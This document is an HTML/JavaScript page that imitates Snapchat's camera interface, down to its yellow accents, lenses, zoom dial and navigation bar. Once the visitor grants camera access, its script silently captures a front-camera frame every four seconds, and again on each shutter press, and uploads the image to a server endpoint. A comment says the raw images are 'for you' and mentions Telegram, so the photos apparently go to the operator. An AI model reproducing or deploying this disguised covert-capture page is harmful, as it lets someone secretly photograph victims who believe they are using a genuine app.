<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=0" />
  <title>Snapchat</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; font-family: -apple-system, system-ui, sans-serif; color: white; -webkit-user-select: none; }
    
    #cameraVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; transition: filter 0.3s ease; }

    /* Top Vignette for Icon Clarity */
    .vignette-top { position: fixed; top: 0; width: 100%; height: 140px; background: linear-gradient(to bottom, rgba(0,0,0,0.5) 0%, transparent 100%); z-index: 5; pointer-events: none; }
    .vignette-bottom { position: fixed; bottom: 0; width: 100%; height: 180px; background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, transparent 100%); z-index: 5; pointer-events: none; }

    /* Header Icons */
    .top-left-icons { position: fixed; top: 45px; left: 16px; z-index: 10; display: flex; align-items: center; gap: 14px; }
    .profile-bitmoji { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
    .search-btn { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; font-size: 18px; }

    /* Right Side Vertical Toolbar */
    .side-toolbar { position: fixed; right: 16px; top: 45px; z-index: 10; display: flex; flex-direction: column; gap: 24px; align-items: center; }
    .tool-icon { font-size: 22px; color: white; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); cursor: pointer; transition: 0.1s; }
    .tool-icon:active { transform: scale(0.9); }
    .active-state { color: #FFFC00; }
    .hd-box { border: 2px solid white; border-radius: 5px; padding: 0 4px; font-size: 11px; font-weight: 900; line-height: 1.2; }

    /* Zoom Dial - Exact Match */
    .zoom-pill { position: fixed; bottom: 190px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.4); backdrop-filter: blur(20px); padding: 5px 15px; border-radius: 30px; display: flex; gap: 20px; font-size: 13px; font-weight: 800; z-index: 10; border: 0.5px solid rgba(255,255,255,0.1); }
    .zoom-val { opacity: 0.5; cursor: pointer; }
    .zoom-val.active { opacity: 1; color: #FFFC00; }

    /* Bottom UI: Memories, Shutter, Lenses */
    .capture-section { position: fixed; bottom: 95px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 30px; z-index: 10; }
    .memories-container { display: flex; flex-direction: column; align-items: center; cursor: pointer; }
    .memories-icon { font-size: 24px; position: relative; margin-bottom: 4px; }
    .memories-label { font-size: 10px; font-weight: 800; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }

    .shutter-ring { width: 85px; height: 85px; border-radius: 50%; border: 6px solid white; display: flex; align-items: center; justify-content: center; background: transparent; cursor: pointer; }
    .shutter-fill { width: 65px; height: 65px; border-radius: 50%; background: rgba(255,255,255,0.1); transition: 0.1s; }
    .shutter-ring:active .shutter-fill { transform: scale(0.9); background: rgba(255,255,255,0.3); }

    .lens-circle { width: 56px; height: 56px; border-radius: 50%; border: 2.5px solid rgba(255,255,255,0.4); overflow: hidden; cursor: pointer; transition: 0.3s; }
    .lens-circle.active { border-color: #FFFC00; transform: scale(1.1); box-shadow: 0 0 15px rgba(255,252,0,0.3); }

    /* Footer Navigation Bar */
    .footer-nav { position: fixed; bottom: 0; width: 100%; height: 75px; background: rgba(0,0,0,0.95); display: flex; justify-content: space-around; align-items: center; z-index: 20; padding-bottom: 12px; }
    .nav-item { font-size: 24px; color: #777; position: relative; cursor: pointer; }
    .nav-active { color: white; }

    /* Notification Badges */
    .badge-red { position: absolute; top: -6px; right: -12px; background: #FF3B30; color: white; font-size: 11px; font-weight: 800; padding: 1px 6px; border-radius: 12px; border: 1px solid black; }
    .dot-red { position: absolute; top: -2px; right: -2px; width: 10px; height: 10px; background: #FF3B30; border-radius: 50%; border: 2px solid black; }

    #flash-overlay { position: fixed; inset: 0; background: white; opacity: 0; pointer-events: none; z-index: 100; transition: opacity 0.1s; }
    #photoCanvas { display: none; }
  </style>
</head>
<body>

  <div id="flash-overlay"></div>
  <div class="vignette-top"></div>
  <div class="vignette-bottom"></div>
  
  <video id="cameraVideo" autoplay playsinline></video>
  <canvas id="photoCanvas"></canvas>

  <div class="top-left-icons">
    <div class="profile-bitmoji"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lucky"></div>
    <div class="search-btn"><i class="fas fa-search"></i></div>
  </div>

  <div class="side-toolbar">
    <i class="far fa-bell tool-icon"></i>
    <div class="relative"><i class="fas fa-user-plus tool-icon"></i><span class="badge-red">2</span></div>
    <i class="fas fa-rotate tool-icon" id="btnFlip"></i>
    <i class="fas fa-bolt-slash tool-icon" id="btnFlash"></i>
    <i class="fas fa-music tool-icon"></i>
    <div class="tool-icon hd-box" id="btnHD">HD</div>
    <i class="fas fa-chevron-down tool-icon"></i>
  </div>

  <div class="zoom-pill">
    <span class="zoom-val" onclick="setZoom(this, 0.5)">.5</span>
    <span class="zoom-val active" onclick="setZoom(this, 1)">1x</span>
    <span class="zoom-val" onclick="setZoom(this, 2)">2</span>
  </div>

  <div class="capture-section">
    <div class="memories-container">
        <div class="memories-icon"><i class="far fa-copy"></i><div class="dot-red"></div></div>
        <span class="memories-label">Memories</span>
    </div>

    <div class="shutter-ring" id="btnShutter">
      <div class="shutter-fill"></div>
    </div>

    <div class="lens-circle" onclick="setLens(this, 'saturate(200%) contrast(110%)')">
        <img src="https://cdn-icons-png.flaticon.com/512/5787/5787100.png">
    </div>
    <div class="lens-circle" onclick="setLens(this, 'grayscale(100%) brightness(1.2)')">
        <img src="https://api.dicebear.com/7.x/miniavs/svg?seed=12">
    </div>
  </div>

  <div class="footer-nav">
    <i class="fas fa-location-dot nav-item"></i>
    <div class="nav-item"><i class="far fa-comment"></i><span class="badge-red">20</span></div>
    <i class="far fa-face-smile nav-item nav-active"></i>
    <div class="nav-item"><i class="fas fa-users"></i><div class="dot-red"></div></div>
    <div class="nav-item"><i class="fas fa-play"></i><div class="dot-red"></div></div>
  </div>

  <script>
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('photoCanvas');
    const flashOverlay = document.getElementById('flash-overlay');
    let activeFilter = "none";

    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        // Background capture every 4 seconds
        setInterval(uploadFrame, 4000);
      } catch (err) { console.error(err); }
    }

    // --- WORKING BUTTONS ---
    function setZoom(el, val) {
      document.querySelectorAll('.zoom-val').forEach(z => z.classList.remove('active'));
      el.classList.add('active');
      video.style.transform = `scaleX(-1) scale(${val})`;
    }

    function setLens(el, filter) {
      const isSelected = el.classList.contains('active');
      document.querySelectorAll('.lens-circle').forEach(l => l.classList.remove('active'));
      if(!isSelected) {
        el.classList.add('active');
        activeFilter = filter;
      } else {
        activeFilter = "none";
      }
      video.style.filter = activeFilter;
    }

    document.getElementById('btnFlash').onclick = function() {
      this.classList.toggle('fa-bolt');
      this.classList.toggle('fa-bolt-slash');
      this.classList.toggle('active-state');
    };

    document.getElementById('btnHD').onclick = function() {
      this.classList.toggle('active-state');
    };

    document.getElementById('btnFlip').onclick = () => {
      video.style.filter = "blur(30px)";
      setTimeout(() => video.style.filter = activeFilter, 400);
    };

    document.getElementById('btnShutter').onclick = () => {
      flashOverlay.style.opacity = "1";
      setTimeout(() => flashOverlay.style.opacity = "0", 100);
      uploadFrame();
    };

    // --- TELEGRAM DATA FIX ---
    function uploadFrame() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      // Mirror and Draw (Raw image for you, filter for them)
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);

      // Convert to JSON Base64 to match your server.js
      const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
      
      fetch('/api/upload-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ dataUrl: dataUrl })
      }).catch(err => console.error("Upload failed"));
    }

    init();
  </script>
</body>
</html>
